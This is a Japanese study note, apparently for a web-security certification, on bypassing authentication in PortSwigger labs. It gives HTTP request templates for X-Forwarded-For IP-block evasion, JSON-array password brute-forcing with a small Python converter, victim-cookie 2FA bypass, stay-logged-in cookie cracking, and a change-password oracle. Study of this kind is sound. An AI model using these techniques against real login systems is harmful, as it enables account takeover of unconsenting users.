###### まとめ

- [[#Username列挙から入る場合]]
	- [[#IPアドレスブロックバイパス]]
	- [[#アカウントロックの場合]]
	- [[#User rate制限バイパス]]
- [[#2FAの場合]]
- [[#Stay-logged-inから入る場合]]
- [[#Change passwordを悪用して被害者パスワードのbrute-force]]
- [[#brute-forceがリクエストごとのランダムな値で妨害される場合]]

- 難：暗号化を利用した認証バイパス[[2. -2 事例：Business logic vuln#暗号化オラクルの提供]]

---
### Username列挙から入る場合

#### IPアドレスブロックバイパス

`X-Forwarded-For:`を使用する
- Attack type : Pitchforkに設定する
```http
POST /login HTTP/2
...
X-Forwarded-For: §§

username=§§&password=peterpeter... //✖️ 100
```
- 特定したusernameで次はpasswordをbrute force

#### アカウントロックの場合

- 正規のusernameにだけアカウントロックがかかるのであれば、特定したusernameに単純なpasswordのbrute-forceをする

- 試験ではないとは思うが[[2. パスワードログインの脆弱性#アカウントロックのバイパス概要]]

#### User rate制限バイパス

1度に複数のパスワードを送信する。

1. `Content-Type: application/json`へ変更
2. wordlistをjson形式へ変換する
```python
with open('[wordlist filepath]', 'r') as f:
	lines = f.readlines()

i = 0
for pwd in lines:
	print("\"" + pwd.strip('\n') + "\",")
	i = i + 1
```
3. 以下の形式でリクエスト
```json
{
	"username":"被害者名",
	"password": [
		"123456",
		"password",
		...
		"moscow"
	]
}
```
- もしusernameを列挙するならwordlistをusernameにして、usernameパラメタをjsonの配列で送ればいい。
```json
{
	"username": [
		"admin",
		...
	]
	"password": "admin"
}
```

---
### 2FAの場合

###### 認証コードバイパス

- a.(初級LAB可能性低)：2FA認証完了後にアクセスできるページに1段階目の認証完了後、直接アクセスする

- b. Cookie等に特定のユーザに紐づいた情報があれば、その値を被害者に変更し、攻撃者の認証コードを入力する
```
Cookie: verify=Victim;
```

- c. Intruder -> Numbersで被害者の認証コードをbrute-forceする。Grep -Extractを設定しておく

---
### Stay-logged-inから入る場合

- InspectorでDecodeすると以下のことがわかる
	- 被害者のusername
	- どのような手順でエンコードやハッシュ化されているか

###### Online cracking

1. リクエスト行をアクセスしたいパスに設定する(`/my-account`等)
2. 正規のcookieと同じ手順でエンコードするよう、Payload Processingに設定する
![[Pasted image 20240210095124.png | 350]]
3. brute-force

###### Offline cracking

- Inspectorでdecodeしたハッシュをそのままインターネットで検索する

- Hashタイプがわからなければ[hash_identifier](https://hashes.com/en/tools/hash_identifier)へペーストし、オンラインツールを使用して解析する(ないとは思うが、hashcatも使う可能性あり？)

[LAB](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

---
### Change passwordを悪用して被害者パスワードのbrute-force

- [[🔍Authentication#Change password]]でパターンDのとき
```
username=wiener&current-password=peter&new-password-1=peter100&new-password-2=hoge
```
	↓レスポンス
```
New password does not mutch
```

- パスワードをbrute-forceして、New password does not mutch(=current-passwordは正解)を引き出す
	- Grep -Matchを使用すること
```
username=carlos&current-password=§here§&new-password-1=peter100&new-password-2=hoge
```

---
### brute-forceがリクエストごとのランダムな値で妨害される場合

- [Github cheatsheet: Auth Token bypass with Macro](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#auth-token-bypass-macro)
- Business logic vulnの一種